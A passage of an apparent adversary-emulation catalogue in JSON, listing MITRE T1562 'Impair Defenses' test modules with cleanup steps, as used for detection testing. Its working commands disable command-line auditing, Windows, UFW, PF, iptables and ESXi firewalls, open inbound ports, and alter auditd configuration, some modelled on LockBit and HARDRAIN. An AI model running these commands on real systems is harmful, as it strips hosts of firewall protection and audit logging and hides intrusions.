      "description": "In Windows operating systems, command line auditing is controlled through the following registry value:\n\n  Registry Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\n  \n  Registry Value: ProcessCreationIncludeCmdLine_Enabled\n\nWhen command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.\nThis information is crucial for security monitoring and forensic analysis, as it helps organizations detect and investigate unauthorized or malicious activities within their systems.\nBy default, command line auditing may not be enabled in Windows systems, and administrators must manually configure the appropriate registry settings to activate it.\nConversely, attackers may attempt to tamper with these registry keys to disable command line auditing, as part of their efforts to evade detection and cover their tracks while perpetrating malicious activities.\n\nBecause this attack runs a Powershell cmdlet, this attack can be detected by monitoring both:\n  Powershell Logging (Windows Powershell Event ID 400, 800, 4103, 4104)\n  Registry events (Windows Event ID 4657, Sysmon Event ID 13)\n\nRead more here:\nhttps://securitydatasets.com/notebooks/raglox/windows/defense_evasion/SDWIN-220703123711.html\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-itemproperty?view=powershell-7.4#example-2-add-a-registry-entry-to-a-key\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore\n",
        "elevation_required": true,
        "cleanup_command": "New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "95f5c72f-6dfe-45f3-a8c1-d8faa07176fa",
      "module_name": "Disable Windows Command Line Auditing using Powershell Cmdlet"
    },
    {
      "index": 1581,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh advfirewall set currentprofile state off\n",
        "elevation_required": false,
        "cleanup_command": "netsh advfirewall set currentprofile state on >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "88d05800-a5e4-407e-9b53-ece4174f197f",
      "module_name": "Disable Microsoft Defender Firewall"
    },
    {
      "index": 1582,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 1 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "afedc8c4-038c-4d82-b3e5-623a95f8a612",
      "module_name": "Disable Microsoft Defender Firewall via Registry"
    },
    {
      "index": 1583,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\nnetsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes\n",
        "elevation_required": false,
        "cleanup_command": "netsh advfirewall reset >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d9841bf8-f161-4c73-81e9-fd773a5ff8c1",
      "module_name": "Allow SMB and RDP on Microsoft Defender Firewall"
    },
    {
      "index": 1584,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh advfirewall firewall add rule name=\"RAGLOX moduleing\" action=allow dir=in protocol=TCP localport=450 \n",
        "elevation_required": true,
        "cleanup_command": "netsh advfirewall firewall delete rule name=\"RAGLOX moduleing\" protocol=TCP localport=450 >nul 2>&1"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "15e57006-79dd-46df-9bf9-31bc24fb5a80",
      "module_name": "Opening ports for proxy - HARDRAIN"
    },
    {
      "index": 1585,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "This test will attempt to open a local port defined by input arguments to any profile",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any",
        "elevation_required": true,
        "cleanup_command": "netsh advfirewall firewall delete rule name=\"Open Port to Any\" | Out-Null"
      },
      "variables": [
        {
          "name": "local_port",
          "description": "This is the local port you wish to test opening",
          "type": "integer",
          "default_value": 3389
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9636dd6e-7599-40d2-8eee-ac16434f35ed",
      "module_name": "Open a local port through Windows Firewall to any profile"
    },
    {
      "index": 1586,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "This test will attempt to allow an executable through the system firewall located in the Users directory",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"#{exe_file_path}\" -Destination \"C:\\Users\\$env:UserName\" -Force\nnetsh advfirewall firewall add rule name=\"RX Module\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\RAGLOXTest.exe\" enable=yes\n",
        "elevation_required": true,
        "cleanup_command": "netsh advfirewall firewall delete rule name=\"RX Module\" | Out-Null\nRemove-Item C:\\Users\\$env:UserName\\RAGLOXTest.exe -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "exe_file_path",
          "description": "path to exe file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1562.004\\bin\\RAGLOXTest.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6f5822d2-d38d-4f48-9bfc-916607ff6b8c",
      "module_name": "Allow Executable Through Firewall Located in Non-Standard Location"
    },
    {
      "index": 1587,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ufw disable\n",
        "elevation_required": true,
        "cleanup_command": "ufw enable\nufw status verbose\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ufw is installed on the machine.\n",
          "check_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "fe135572-edcd-49a2-afe6-1d39521c5a9a",
      "module_name": "Stop/Start UFW firewall"
    },
    {
      "index": 1588,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Stop the Packet Filter if installed.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "service pf stop\nservice pf disable\n",
        "elevation_required": true,
        "cleanup_command": "service pf enable\nservice pf start\nservice pf status\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if pfctl is installed on the machine.\n",
          "check_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "0ca82ed1-0a94-4774-9a9a-a2c83a8022b7",
      "module_name": "Stop/Start Packet Filter"
    },
    {
      "index": 1589,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "systemctl stop ufw\n",
        "elevation_required": true,
        "cleanup_command": "systemctl start ufw\nsystemctl status ufw\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if systemctl and ufw is installed on the machine.\n",
          "check_command": "if [ ! -x \"$(command -v systemctl)\" ]; then echo -e \"\\n***** systemctl NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "9fd99609-1854-4f3c-b47b-97d9a5972bd1",
      "module_name": "Stop/Start UFW firewall systemctl"
    },
    {
      "index": 1590,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ufw logging off\n",
        "elevation_required": true,
        "cleanup_command": "ufw logging low\nufw status verbose\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ufw is installed on the machine and enabled.\n",
          "check_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "8a95b832-2c2a-494d-9cb0-dc9dd97c8bad",
      "module_name": "Turn off UFW logging"
    },
    {
      "index": 1591,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ufw prepend deny from 1.2.3.4\nufw status numbered\n",
        "elevation_required": true,
        "cleanup_command": "{ echo y; echo response; } | ufw delete 1\nufw status numbered\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if ufw is installed on the machine and enabled.\n",
          "check_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "b2563a4e-c4b8-429c-8d47-d5bcb227ba7a",
      "module_name": "Add and delete UFW firewall rules"
    },
    {
      "index": 1592,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Add and delete a rule on the Packet Filter (PF) if installed and enabled. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"block in proto tcp from 1.2.3.4 to any\" | pfctl -a pf-rules -f -\npfctl -a pf-rules -s rules\n",
        "elevation_required": true,
        "cleanup_command": "pfctl -a pf-rules -F rules\nsed -i \"\" '/anchor pf-rules/d'\npfctl -f /etc/pf.conf\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if pf is installed on the machine and enabled.\n",
          "check_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n",
          "install_command": "echo \"anchor pf-rules >> /etc/pf.conf\"\npfctl -f /etc/pf.conf\n"
        }
      ],
      "rx_module_id": "8b23cae1-66c1-41c5-b79d-e095b6098b5b",
      "module_name": "Add and delete Packet Filter rules"
    },
    {
      "index": 1593,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules\ngrep \"# THIS IS A COMMENT\" /etc/ufw/user.rules\n",
        "elevation_required": true,
        "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if /etc/ufw/user.rules exists.\n",
          "check_command": "if [ ! -f \"/etc/ufw/user.rules\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "beaf815a-c883-4194-97e9-fdbbb2bbdd7c",
      "module_name": "Edit UFW firewall user.rules file"
    },
    {
      "index": 1594,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf\n",
        "elevation_required": true,
        "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf\ncat /etc/ufw/ufw.conf\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if /etc/ufw/ufw.conf exists.\n",
          "check_command": "if [ ! -f \"/etc/ufw/ufw.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "c1d8c4eb-88da-4927-ae97-c7c25893803b",
      "module_name": "Edit UFW firewall ufw.conf file"
    },
    {
      "index": 1595,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf\n",
        "elevation_required": true,
        "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf\ncat /etc/ufw/sysctl.conf\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if /etc/ufw/sysctl.conf exists.\n",
          "check_command": "if [ ! -f \"/etc/ufw/sysctl.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "c4ae0701-88d3-4cd8-8bce-4801ed9f97e4",
      "module_name": "Edit UFW firewall sysctl.conf file"
    },
    {
      "index": 1596,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw\ngrep \"# THIS IS A COMMENT\" /etc/default/ufw\n",
        "elevation_required": true,
        "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if /etc/default/ufw exists.\n",
          "check_command": "if [ ! -f \"/etc/default/ufw\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "7b697ece-8270-46b5-bbc7-6b9e27081831",
      "module_name": "Edit UFW firewall main configuration file"
    },
    {
      "index": 1597,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "tail /var/log/ufw.log\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if /var/log/ufw.log exists.\n",
          "check_command": "if [ ! -f \"/var/log/ufw.log\" ]; then echo -e \"\\n***** ufw NOT logging *****\\n\"; exit 1; fi\n",
          "install_command": "echo \"\"\n"
        }
      ],
      "rx_module_id": "419cca0c-fa52-4572-b0d7-bc7c6f388a27",
      "module_name": "Tail the UFW firewall log file"
    },
    {
      "index": 1598,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) \nAttackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables \nrules, which in fact \"disable\" iptables. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "iptables-save > /tmp/iptables.rules\niptables -F\n",
        "elevation_required": true,
        "cleanup_command": "iptables-restore < /tmp/iptables.rules\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if iptables is installed on the machine.\n",
          "check_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\n",
          "install_command": "sudo apt-get install iptables\n"
        }
      ],
      "rx_module_id": "7784c64e-ed0b-4b65-bf63-c86db229fd56",
      "module_name": "Disable iptables"
    },
    {
      "index": 1599,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Instead of completely \"disabling\" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.\nBy doing so, they may cause less noise to avoid detection. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "iptables -D OUTPUT -p tcp --dport 21 -j DROP\n",
        "elevation_required": true,
        "cleanup_command": "iptables-restore < /tmp/iptables.rules\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if iptables is installed on the machine.\n",
          "check_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\nif ! echo \"$(iptables -L)\" | grep -q \"DROP .*dpt:ftp\"; then echo -e \"\\n***** this firewall rule is NOT activated *****\\n***** activate it by executing \\\"iptables -A OUTPUT -p tcp --dport 21 -j DROP\\\" *****\\n\"; exit 1; fi\n",
          "install_command": "iptables-save > /tmp/iptables.rules\nif echo \"$(iptables -L)\" | grep -q \"DROP .*dpt:ftp\"; then echo \"Rule found\"; else echo \"Rule not found. Setting it...\"; iptables -A OUTPUT -p tcp --dport 21 -j DROP; fi\n"
        }
      ],
      "rx_module_id": "899a7fb5-d197-4951-8614-f19ac4a73ad4",
      "module_name": "Modify/delete iptables firewall rules"
    },
    {
      "index": 1600,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "An adversary tries to modify the windows firewall registry\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a4651931-ebbb-4cde-9363-ddf3d66214cb",
      "module_name": "LockBit Black - Unusual Windows firewall registry modification -cmd"
    },
    {
      "index": 1601,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "An adversary tries to modify the windows firewall registry.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\"  -Name EnableFirewall -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "80b453d1-eec5-4144-bf08-613a6c3ffe12",
      "module_name": "LockBit Black - Unusual Windows firewall registry modification -Powershell"
    },
    {
      "index": 1602,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh firewall set opmode mode=disable\n",
        "elevation_required": true,
        "cleanup_command": "netsh firewall set opmode mode=enable >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "91f348e6-3760-4997-a93b-2ceee7f254ee",
      "module_name": "Blackbit - Disable Windows Firewall using netsh firewall"
    },
    {
      "index": 1603,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "Adversaries may disable the ESXI firewall via ESXCLI\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToRagloxModulesFolder\\..\\rx_modules\\T1562.004\\src\\esxi_disable_firewall.txt\n",
        "elevation_required": false,
        "cleanup_command": "#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToRagloxModulesFolder\\..\\rx_modules\\T1562.004\\src\\esxi_enable_firewall.txt\n"
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "plink_file",
          "description": "Path to Putty",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "username",
          "description": "username used to log into ESXi",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "password",
          "description": "password used to log into ESXI",
          "type": "string",
          "default_value": "n/a"
        }
      ],
      "prerequisites": [
        {
          "description": "The plink executable must be found in the ExternalPayloads folder.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "bac8a340-be64-4491-a0cc-0985cb227f5a",
      "module_name": "ESXi - Disable Firewall via Esxcli"
    },
    {
      "index": 1604,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "This test will attempt to create a new inbound/outbound firewall rule using the New-NetFirewallRule commandlet.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-NetFirewallRule -DisplayName \"New rule\" -Direction \"#{direction}\" -LocalPort \"#{local_port}\" -Protocol \"#{protocol}\" -Action \"#{action}\"",
        "elevation_required": true,
        "cleanup_command": "Remove-NetFirewallRule -DisplayName \"New rule\""
      },
      "variables": [
        {
          "name": "direction",
          "description": "Direction can be Inbound or Outbound",
          "type": "string",
          "default_value": "Inbound"
        },
        {
          "name": "local_port",
          "description": "This is the local port you wish to test opening",
          "type": "integer",
          "default_value": 21
        },
        {
          "name": "protocol",
          "description": "This is the protocol",
          "type": "string",
          "default_value": "TCP"
        },
        {
          "name": "action",
          "description": "This is the action",
          "type": "string",
          "default_value": "allow"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "94be7646-25f6-467e-af23-585fb13000c8",
      "module_name": "Set a firewall rule using New-NetFirewallRule"
    },
    {
      "index": 1605,
      "technique_id": "T1562.004",
      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
      "description": "This test sets the default ESXi firewall action to PASS instead of DROP. This allows all incoming and outgoing traffic.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli network firewall set --default-action true\"\n",
        "elevation_required": false,
        "cleanup_command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli network firewall set --default-action false\"\n"
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi server.",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on the ESXi server.",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privileged user's password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The plink executable must be found in the ExternalPayloads folder.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "a67e8aea-ea7c-4c3b-9b1b-8c2957c3091d",
      "module_name": "ESXi - Set Firewall to PASS Traffic"
    },
    {
      "index": 1606,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Emulates modification of auditd configuration files\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\n",
        "elevation_required": true,
        "cleanup_command": "sed -i '$ d' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{auditd_config_file_name}\nelse sed -i '$ d' /etc/audit/#{auditd_config_file_name}\nfi\nsed -i '$ d' /etc/#{libaudit_config_file_name}\n"
      },
      "variables": [
        {
          "name": "audisp_config_file_name",
          "description": "The name of the audispd configuration file to be changed",
          "type": "string",
          "default_value": "audispd.conf"
        },
        {
          "name": "auditd_config_file_name",
          "description": "The name of the auditd configuration file to be changed",
          "type": "string",
          "default_value": "auditd.conf"
        },
        {
          "name": "libaudit_config_file_name",
          "description": "The name of the libaudit configuration file to be changed",
          "type": "string",
          "default_value": "libaudit.conf"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "212cfbcf-4770-4980-bc21-303e37abd0e3",
      "module_name": "Auditing Configuration Changes on Linux Host"
    },
    {
      "index": 1607,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Emulates modification of auditd configuration files\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}\n",
        "elevation_required": true,
        "cleanup_command": "sed -i \"\" '/#art_test_1562_006_1/d' /etc/security/#{auditd_config_file_name}\n"
      },
      "variables": [
        {
          "name": "auditd_config_file_name",
          "description": "The name of the auditd configuration file to be changed",
          "type": "string",
          "default_value": "audit_event"
        }
      ],
